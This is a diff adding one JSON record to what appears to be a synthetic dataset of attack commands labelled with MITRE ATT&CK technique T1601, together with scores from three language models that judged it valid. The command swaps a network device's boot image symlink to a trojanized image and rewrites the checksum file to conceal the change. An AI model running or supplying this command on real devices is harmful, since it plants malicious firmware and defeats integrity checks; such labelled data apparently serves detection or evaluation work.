@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1601",
+  "platform": "Network Devices",
+  "shell": "Bash",
+  "command": "ln -sf /bootflash/trojan.img /bootflash/active.img && sync && md5sum /bootflash/active.img > /etc/firmware/active.img.md5",
+  "explanation": "Redirects the boot image symlink to a malicious image and updates its checksum file to mask the redirection.",
+  "rationale_steps": [
+    "Change the symlink target to point at the trojanized image",
+    "Flush filesystem metadata updates",
+    "Recompute and store MD5 to fit the new target image"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1601-3f5b9fd2-c6e10e24",
+  "source_prompt_hash": "3f5b9fd2",
+  "timestamp_utc": "2025-09-30T04:34:26.844102Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed Bash with valid ln -sf usage, correct && chaining, and proper output redirection; no quoting or flag issues.",
+        "semantic_score": 4,
+        "semantic_justification": "Plausibly repoints a boot image symlink and regenerates a checksum consistent with T1601, but it assumes root-level permissions and specific platform paths/behaviors that may not universally hold on network devices.",
+        "combined_score": 4.5,
+        "confidence": 0.8,
+        "timestamp": "2025-10-02T17:08:38.313707Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with valid use of `ln -sf`, `&&` chaining, `sync`, `md5sum`, and output redirection, with no syntax errors or unbalanced constructs.",
+        "semantic_score": 5,
+        "semantic_justification": "The command precisely implements T1601 by atomically replacing the active boot image symlink with a trojan image, flushing to disk with `sync`, and then overwriting the checksum file to mask the tampering — a realistic and operationally coherent firmware substitution attack on network devices.",
+        "combined_score": 5.0,
+        "confidence": 0.92,
+        "timestamp": "2026-02-19T01:12:01.240136Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command uses standard Bash syntax, including valid command chaining with logical AND operators and correct flag usage for ln and md5sum.",
+        "semantic_score": 5,
+        "semantic_justification": "The command accurately implements the technique by swapping the active boot image via a symlink and attempting to bypass basic integrity checks by updating the associated MD5 hash file.",
+        "combined_score": 5.0,
+        "confidence": 1.0,
+        "timestamp": "2026-02-19T01:12:04.835495Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.667,
+    "llm_average_score": 4.833,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
